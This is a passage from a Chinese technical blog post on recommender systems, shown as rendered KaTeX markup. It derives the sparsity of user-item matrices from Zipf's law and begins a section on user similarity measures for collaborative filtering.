class="vlist" style="height:0.3448em;"><span style="top:-2.3567em;margin-left:-0.109em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1433em;"><span/></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2671em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.19em;"><span style="top:-2.464em;"><span class="pstrut" style="height:3.15em;"/><span class="mord"><span class="mord">∥</span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord">∥</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7196em;"><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span></span><span style="top:-3.38em;"><span class="pstrut" style="height:3.15em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-4.19em;"><span class="pstrut" style="height:3.15em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span/></span></span></span></span></span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3998em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span/></span></span></span></span></span><span class="mrel mtight">=</span><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span/></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3998em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2963em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span/></span></span></span></span></span><span class="mrel mtight">=</span><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2025em;"><span/></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4415em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∏</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9335em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-2.4413em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span/></span></span></span></span></span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3645em;"><span/></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<h3 data-id="heading-3">稀疏性</h3>
<p>稀疏性是齐夫分布在推荐系统矩阵表示中的直接后果。随着马太效应将大部分评分推向少数热门列，用户-物品矩阵在传统线性代数意义上变得<strong>高度稀疏</strong>。</p>
<p>于任意用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>，选中排名为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 的物品 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">V_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 的概率 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">P_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 依然由齐夫定律定义：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>P</mi><mi>i</mi></msub><mo>=</mo><mfrac><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mi>i</mi></mrow><mrow><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>M</mi></munderover><mn>1</mn><mi mathvariant="normal">/</mi><mi>j</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">P_i = \frac{1/i}{\sum_{j=1}^{M} 1/j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.734em;vertical-align:-1.307em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.1288em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1/</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1/</span><span class="mord mathnormal">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.307em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>为了衡量稀疏性对协作的影响，需要计算：对于一个用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>，有多少<strong>其他用户</strong>会和他因为同一个物品 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">V_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 产生关联？</p>
<p>（<strong>单个物品的碰撞期望计算</strong>）假设系统中共有 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></span> 个用户。对于排名第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 的物品，其他任一用户选中它的概率也是 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">P_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。因此，在 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">M-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span> 个其他用户中，选中该物品的期望人数为：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>E</mi><mi>i</mi></msub><mo>=</mo><mo stretchy="false">(</mo><mi>M</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>⋅</mo><msub><mi>P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">E_i = (M - 1) \cdot P_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p>将所有 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></span> 个物品能带来的“共享机会”累加，得到与用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span> <strong>至少共享一个评分的其他用户总数</strong>的理论期望值：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>Total Shared Users</mtext><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>M</mi></munderover><mo stretchy="false">(</mo><mi>M</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>⋅</mo><msub><mi>P</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\text{Total Shared Users} = \sum_{i=1}^{M} (M - 1) \cdot P_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord text"><span class="mord">Total Shared Users</span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3.106em;vertical-align:-1.2777em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8283em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"/><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span/></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p>这组公式揭示了<strong>稀疏性将重点推向最受欢迎的用户，并有使推荐器变得短视 (myopic) 的风险。</strong></p>
<blockquote>
<p>[!NOTE]</p>
<p>X轴：用户的排名</p>
<p>Y轴：相似度计数</p>
<ul>
<li>这代表了系统在该排名区间内发现的“相似用户对”的数量。</li>
<li>数值越高，说明算法在该排名附近越容易找到协作邻居。</li>
</ul>
<p>从散点分布的总趋势可以看出，<strong>随着用户排名的增加，相似度计数呈现明显的下降趋势。</strong></p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/015f0c7f943c45bd8f3b79ddc14bfdf6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU2ltb25Ta3l3YWxrZXI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769475680&amp;x-signature=H4ihxTN3qtgwrcJBSpBks%2BC5yf8%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-4">协同过滤的用户相似度</h3>
<p>在协同过滤算法体系中，衡量用户之间的相似程度是构建推荐系统的逻辑起点。通过将用户<strong>映射到多维特征空间</strong>，可以将抽象的兴趣转化为可计算的几何距离或统计相关性，从而实现基于邻域的预测。</p>
<p>在经典几何学中，点与点之间的关系通常由**度量（Metric）**定义。一个标准的度量空间需要满足包括三角不等式在内的严格数学性质：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo><mo>≤</mo><mi>d</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>+</mo><mi>d</mi><mo stretchy="false">(</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d(a, c) \leq d(a, b) + d(b, c)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span></span></span></span></span></div>
<p>在机器学习任务中，研究者更倾向于使用**相似度（Similarity）**函数。当不相似度函数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">d</span></span></span></span></span> 的取值范围在 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1</span><span class="mclose">]</span></span></span></span></span> 时，相似度定义为：</p>
